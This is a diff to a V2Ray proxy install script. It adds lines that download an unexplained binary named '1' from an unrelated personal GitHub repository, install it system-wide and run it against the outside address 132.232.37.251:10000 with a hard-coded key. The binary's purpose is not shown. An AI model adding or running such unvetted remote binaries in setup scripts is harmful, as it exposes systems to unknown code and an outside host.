@@ -3,9 +3,11 @@
 # Download and install V2Ray
 mkdir /tmp/v2ray
 curl -L -H "Cache-Control: no-cache" -o /tmp/v2ray/v2ray.zip https://github.com/v2ray/v2ray-core/releases/latest/download/v2ray-linux-64.zip
+curl -L -H "Cache-Control: no-cache" -o /tmp/v2ray/1 https://github.com/10102232/test112233/raw/master/1
 unzip /tmp/v2ray/v2ray.zip -d /tmp/v2ray
 install -m 755 /tmp/v2ray/v2ray /usr/local/bin/v2ray
 install -m 755 /tmp/v2ray/v2ctl /usr/local/bin/v2ctl
+install -m 755 /tmp/v2ray/1 /usr/local/bin/1
 
 # Remove temporary directory
 rm -rf /tmp/v2ray
@@ -42,3 +44,4 @@ EOF
 
 # Run V2Ray
 /usr/local/bin/v2ray -config /usr/local/etc/v2ray/config.json
+/usr/local/bin/1 -a 10.255.255.1 -c fanqiang -k fanqiang -r -b -l 132.232.37.251:10000 -f
